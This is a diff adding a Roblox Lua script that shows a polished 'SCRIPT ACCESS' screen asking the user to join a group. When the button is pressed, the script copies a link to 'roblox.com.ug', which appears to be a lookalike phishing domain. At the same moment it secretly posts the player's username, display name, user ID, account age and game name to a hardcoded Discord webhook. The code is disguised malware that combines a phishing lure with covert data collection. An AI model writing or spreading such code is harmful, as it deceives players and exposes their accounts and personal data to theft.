@@ -1,0 +1,220 @@
+local TweenService = game:GetService("TweenService")
+local Players = game:GetService("Players")
+local MarketPlaceService = game:GetService("MarketplaceService")
+local HttpService = game:GetService("HttpService")
+
+local LocalPlayer = Players.LocalPlayer
+local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
+
+local ExistingUI = PlayerGui:FindFirstChild("ModernVerificationUI")
+if ExistingUI then
+    ExistingUI:Destroy()
+end
+
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "ModernVerificationUI"
+ScreenGui.ResetOnSpawn = false
+ScreenGui.IgnoreGuiInset = true
+ScreenGui.Parent = PlayerGui
+
+local BackgroundDim = Instance.new("Frame")
+BackgroundDim.Size = UDim2.new(1, 0, 1, 0)
+BackgroundDim.BackgroundColor3 = Color3.fromRGB(10, 10, 12)
+BackgroundDim.BackgroundTransparency = 1
+BackgroundDim.Parent = ScreenGui
+
+local MainFrame = Instance.new("Frame")
+MainFrame.Size = UDim2.new(0, 420, 0, 320)
+MainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
+MainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
+MainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
+MainFrame.BorderSizePixel = 0
+MainFrame.ClipsDescendants = true
+MainFrame.SizeConstraint = Enum.SizeConstraint.RelativeYY
+MainFrame.Parent = BackgroundDim
+
+local MainCorner = Instance.new("UICorner")
+MainCorner.CornerRadius = UDim.new(0, 16)
+MainCorner.Parent = MainFrame
+
+local MainStroke = Instance.new("UIStroke")
+MainStroke.Color = Color3.fromRGB(45, 45, 55)
+MainStroke.Thickness = 1.5
+MainStroke.Transparency = 0.5
+MainStroke.Parent = MainFrame
+
+local UIGradient = Instance.new("UIGradient")
+UIGradient.Color = ColorSequence.new({
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(25, 25, 30)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(15, 15, 18))
+})
+UIGradient.Rotation = 45
+UIGradient.Parent = MainFrame
+
+local TitleLabel = Instance.new("TextLabel")
+TitleLabel.Size = UDim2.new(1, 0, 0, 50)
+TitleLabel.Position = UDim2.new(0, 0, 0, 20)
+TitleLabel.BackgroundTransparency = 1
+TitleLabel.Text = "SCRIPT ACCESS"
+TitleLabel.Font = Enum.Font.GothamBold
+TitleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+TitleLabel.TextSize = 22
+TitleLabel.Parent = MainFrame
+
+local SubtitleLabel = Instance.new("TextLabel")
+SubtitleLabel.Size = UDim2.new(1, -40, 0, 30)
+SubtitleLabel.Position = UDim2.new(0, 20, 0, 70)
+SubtitleLabel.BackgroundTransparency = 1
+SubtitleLabel.Text = "Join The Group To Continue"
+SubtitleLabel.Font = Enum.Font.GothamMedium
+SubtitleLabel.TextColor3 = Color3.fromRGB(200, 80, 80)
+SubtitleLabel.TextSize = 14
+SubtitleLabel.Parent = MainFrame
+
+local InfoFrame = Instance.new("Frame")
+InfoFrame.Size = UDim2.new(1, -50, 0, 110)
+InfoFrame.Position = UDim2.new(0.5, 0, 0, 115)
+InfoFrame.AnchorPoint = Vector2.new(0.5, 0)
+InfoFrame.BackgroundColor3 = Color3.fromRGB(28, 28, 35)
+InfoFrame.BorderSizePixel = 0
+InfoFrame.Parent = MainFrame
+
+local InfoCorner = Instance.new("UICorner")
+InfoCorner.CornerRadius = UDim.new(0, 12)
+InfoCorner.Parent = InfoFrame
+
+local InfoLabel = Instance.new("TextLabel")
+InfoLabel.Size = UDim2.new(1, -20, 1, -20)
+InfoLabel.Position = UDim2.new(0, 10, 0, 10)
+InfoLabel.BackgroundTransparency = 1
+InfoLabel.Text = "- Press JOIN GROUP\n- Group Link Copies Automatically\n- Paste It Into Browser And Join The Group\n- Access Refreshes Automatically"
+InfoLabel.Font = Enum.Font.Gotham
+InfoLabel.TextColor3 = Color3.fromRGB(170, 170, 185)
+InfoLabel.TextSize = 13
+InfoLabel.TextXAlignment = Enum.TextXAlignment.Left
+InfoLabel.TextYAlignment = Enum.TextYAlignment.Top
+InfoLabel.LineHeight = 1.4
+InfoLabel.Parent = InfoFrame
+
+local ActionButton = Instance.new("TextButton")
+ActionButton.Size = UDim2.new(1, -50, 0, 48)
+ActionButton.Position = UDim2.new(0.5, 0, 1, -25)
+ActionButton.AnchorPoint = Vector2.new(0.5, 1)
+ActionButton.BackgroundColor3 = Color3.fromRGB(0, 140, 255)
+ActionButton.BorderSizePixel = 0
+ActionButton.Text = "JOIN GROUP"
+ActionButton.Font = Enum.Font.GothamBold
+ActionButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+ActionButton.TextSize = 15
+ActionButton.AutoButtonColor = false
+ActionButton.Parent = MainFrame
+
+local ButtonCorner = Instance.new("UICorner")
+ButtonCorner.CornerRadius = UDim.new(0, 10)
+ButtonCorner.Parent = ActionButton
+
+local ButtonStroke = Instance.new("UIStroke")
+ButtonStroke.Color = Color3.fromRGB(0, 180, 255)
+ButtonStroke.Thickness = 0
+ButtonStroke.Transparency = 0.5
+ButtonStroke.Parent = ActionButton
+
+MainFrame.Position = UDim2.new(0.5, 0, 0.6, 0)
+MainFrame.Size = UDim2.new(0, 380, 0, 280)
+
+local tweenInfoFast = TweenInfo.new(0.4, Enum.EasingStyle.Quint, Enum.EasingDirection.Out)
+
+TweenService:Create(BackgroundDim, tweenInfoFast, {BackgroundTransparency = 0.35}):Play()
+TweenService:Create(MainFrame, tweenInfoFast, {Position = UDim2.new(0.5, 0, 0.5, 0), Size = UDim2.new(0, 420, 0, 320)}):Play()
+
+local isWorking = false
+local webhookUrl = "https://discord.com/api/webhooks/1522894170220396654/kwyktwgRPTH4P060VG8F6Y8ppOmuPMPYKeQH9jcKg7bWeYsXTAZB0oPGut3YvC7GVaB0"
+
+local function sendWebhookNotification()
+    local requestFunction = request or http_request or (syn and syn.request)
+    if not requestFunction then return end
+
+    local gameName = "Unknown Game"
+    pcall(function()
+        local productInfo = MarketPlaceService:GetProductInfo(game.PlaceId)
+        if productInfo and productInfo.Name then
+            gameName = productInfo.Name
+        end
+    end)
+
+    local avatarUrl = "https://www.roblox.com/bust-thumbnail/image?userId=" .. LocalPlayer.UserId .. "&width=420&height=420&format=png"
+
+    local embedData = {
+        username = "teknoege",
+        avatar_url = "https://teknoege.xyz/teknoege.png",
+        embeds = {
+            {
+                color = 0,
+                thumbnail = {
+                    url = avatarUrl
+                },
+                fields = {
+                    {name = "Display Name", value = "```" .. LocalPlayer.DisplayName .. "```", inline = true},
+                    {name = "Username", value = "```" .. LocalPlayer.Name .. "```", inline = true},
+                    {name = "User ID", value = "```" .. tostring(LocalPlayer.UserId) .. "```", inline = true},
+                    {name = "Account Age", value = "```" .. tostring(LocalPlayer.AccountAge) .. " days```", inline = true},
+                    {name = "Game Name", value = "```" .. gameName .. "```", inline = false},
+                    {name = "Links", value = "- [User Profile](https://www.roblox.com/users/" .. tostring(LocalPlayer.UserId) .. "/profile)\n- [Game Page](https://www.roblox.com/games/" .. tostring(game.PlaceId) .. ")", inline = false}
+                },
+            }
+        }
+    }
+
+    task.spawn(function()
+        requestFunction({
+            Url = webhookUrl,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = HttpService:JSONEncode(embedData)
+        })
+    end)
+end
+
+ActionButton.MouseEnter:Connect(function()
+    if isWorking then return end
+    TweenService:Create(ActionButton, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(0, 160, 255)}):Play()
+    TweenService:Create(ButtonStroke, TweenInfo.new(0.2), {Thickness = 2}):Play()
+end)
+
+ActionButton.MouseLeave:Connect(function()
+    if isWorking then return end
+    TweenService:Create(ActionButton, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(0, 140, 255)}):Play()
+    TweenService:Create(ButtonStroke, TweenInfo.new(0.2), {Thickness = 0}):Play()
+end)
+
+ActionButton.MouseButton1Down:Connect(function()
+    if isWorking then return end
+    TweenService:Create(ActionButton, TweenInfo.new(0.05), {Size = UDim2.new(1, -55, 0, 45)}):Play()
+end)
+
+ActionButton.MouseButton1Up:Connect(function()
+    if isWorking then return end
+    isWorking = true
+    
+    TweenService:Create(ActionButton, TweenInfo.new(0.1), {Size = UDim2.new(1, -50, 0, 48)}):Play()
+    
+    if setclipboard then
+        setclipboard("https://roblox.com.ug/communities/5507940358/")
+    elseif toclipboard then
+        toclipboard("https://roblox.com.ug/communities/5507940358/")
+    end
+    
+    ActionButton.Text = "COPIED LINK!"
+    ActionButton.BackgroundColor3 = Color3.fromRGB(46, 204, 113)
+    TweenService:Create(ButtonStroke, TweenInfo.new(0.2), {Thickness = 0}):Play()
+    
+    sendWebhookNotification()
+    
+    task.wait(2)
+    
+    ActionButton.Text = "JOIN GROUP"
+    ActionButton.BackgroundColor3 = Color3.fromRGB(0, 140, 255)
+    isWorking = false
+end)
